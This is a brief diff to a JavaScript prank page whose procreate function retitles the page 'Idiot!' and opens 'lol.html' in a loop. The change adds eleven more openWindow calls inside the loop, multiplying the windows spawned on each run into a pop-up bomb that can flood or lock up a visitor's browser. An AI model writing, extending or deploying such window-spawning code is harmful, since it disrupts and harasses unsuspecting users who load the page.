@@ -26,6 +26,17 @@ function procreate() {
 	changeTitle("Idiot!");
 	for (var i = 0; i < 5; i++) {
 		openWindow('lol.html');
+		openWindow('lol.html');
+		openWindow('lol.html');
+		openWindow('lol.html');
+		openWindow('lol.html');
+		openWindow('lol.html');
+		openWindow('lol.html');
+		openWindow('lol.html');
+		openWindow('lol.html');
+		openWindow('lol.html');
+		openWindow('lol.html');
+		openWindow('lol.html');
 	}
 }
 
